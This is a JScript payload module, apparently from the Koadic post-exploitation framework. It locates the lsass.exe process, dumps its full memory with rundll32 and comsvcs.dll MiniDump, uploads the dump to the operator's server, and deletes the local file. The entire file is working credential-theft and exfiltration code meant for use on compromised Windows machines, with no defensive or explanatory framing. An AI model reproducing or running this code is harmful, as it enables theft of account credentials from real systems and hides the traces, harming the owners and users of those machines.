try
{
    var headers = {};

    var res_file = "~DIRECTORY~\\"+Koadic.uuid()+".bin";

    var lpid = "";

    if (~LSASSPID~ == 0)
    {
        lpid = Koadic.process.getPID("lsass.exe");
        if (lpid)
        {
            Koadic.work.report(lpid.toString(),{'Task': 'pid'});
        }
        else
        {
            Koadic.work.report('',{'Task': 'nopid'});
            var e = Error('Could not identify process ID');
            throw e;
        }
    }
    else
    {
        lpid = ~LSASSPID~;
    }

    var cmd = "C:\\Windows\\System32\\rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump "+ lpid.toString()+ " " + res_file + " full";
    
    Koadic.work.report('',{'Task': 'startrun'});
    var newpid = Koadic.WMI.createProcess(cmd, true);

    /* 
       we only get a process ID returned, so we have to search through running processes
       until we can't find the process anymore. then we'll be able to upload.
    */
    var pidflag = true;
    while (pidflag)
    {
        pidflag = false;
        var processes = Koadic.process.list();
        var items = new Enumerator(processes);
        while (!items.atEnd())
        {
            var proc = items.item();

            try
            {
                if (proc.ProcessId == newpid)
                {
                    pidflag = true;
                    break;
                }
            } catch (e)
            {
            }
            items.moveNext();
        }
    }
    Koadic.work.report('',{'Task': 'endrun'});

    Koadic.work.report('',{'Task': 'upload'});
    Koadic.http.upload(res_file, 'dump', ~CERTUTIL~, 'Task');

    Koadic.work.report('',{'Task': 'delbin'});
    Koadic.file.deleteFile(res_file);

}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
